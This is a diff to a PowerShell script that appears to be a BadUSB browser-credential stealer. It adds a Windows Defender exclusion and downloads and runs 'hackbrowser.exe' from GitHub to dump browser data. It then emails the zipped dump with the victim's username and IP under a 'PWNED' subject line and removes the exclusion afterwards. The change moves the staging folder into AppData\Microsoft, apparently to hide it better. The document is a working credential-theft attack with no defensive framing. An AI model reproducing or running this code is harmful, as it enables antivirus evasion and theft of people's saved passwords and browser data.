@@ -1,8 +1,8 @@
 #Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "C:/Users"
+Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "C:/Users/dump"
-Set-Location "C:/Users/dump"
+mkdir "$env:appdata\Microsoft\dump"
+Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
@@ -21,10 +21,10 @@ $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
-$Message.Attachments.Add("C:/Users/dump/dump.zip")
+$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
-cd "C:/Users"
-Remove-MpPreference -ExclusionPath "C:/Users"
+cd "env:appdata"
+Remove-MpPreference -ExclusionPath "$env:appdata"
